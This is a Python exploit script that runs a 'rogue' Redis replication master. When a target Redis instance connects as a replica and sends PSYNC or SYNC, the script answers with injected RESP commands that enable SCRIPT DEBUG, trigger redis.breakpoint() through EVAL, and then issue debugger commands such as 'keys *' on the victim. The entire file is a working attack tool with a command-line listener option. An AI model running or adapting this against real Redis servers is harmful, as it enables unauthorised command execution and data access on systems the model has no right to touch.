#!/usr/bin/env python3
import socket
import sys
from optparse import OptionParser

CLRF = "\r\n"

def din(sock, cnt):
    try:
        msg = sock.recv(cnt)
        msg = msg.decode().strip().split("\r\n")
        print(f"\033[1;34;40m[->]\033[0m {msg}")
        return msg
    except UnicodeDecodeError:
        return ""

def dout(sock, msg):
    if type(msg) != bytes:
        msg_list = msg.strip().split("\r\n")
        msg = msg.encode()
    else:
        msg_list = msg.decode().strip().split("\r\n")
    sock.send(msg)
    print(f"\033[1;32;40m[<-]\033[0m {msg_list}")


class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        data = " ".join(data)
        resp = ""
        phase = 0
        if "PING" in data:
            resp = "+PONG" + CLRF
            phase = 1
        elif "REPLCONF" in data:
            resp = "+OK" + CLRF
            phase = 2
        elif "PSYNC" in data or "SYNC" in data:
            resp = "+CONTINUE 0 0" + CLRF
            resp = resp.encode()

            resp += self.payload("SCRIPT", "DEBUG", "YES")
            resp += self.payload("EVAL", "redis.breakpoint()", "0")
            phase = 3
        elif "breakpoint" in data:
            resp = self.payload("r", "keys", "*")
            phase = 4
        return resp, phase

    def payload(self, *commands):
        resp = "*" + str(len(commands)) + CLRF
        for c in commands:
            resp += "$" + str(len(c)) + CLRF
            resp += c + CLRF
        return resp.encode()


    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 4:
                break

        return

def runserver(lhost, lport):
    rogue = RogueServer(lhost, lport)
    rogue.exp()


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--lport", dest="lp", type="int",
            help="rogue server listen port, default 21000", default=21000)

    (options, args) = parser.parse_args()
    print(f"SERVER 0.0.0.0:{options.lp}")
    runserver("0.0.0.0", options.lp)

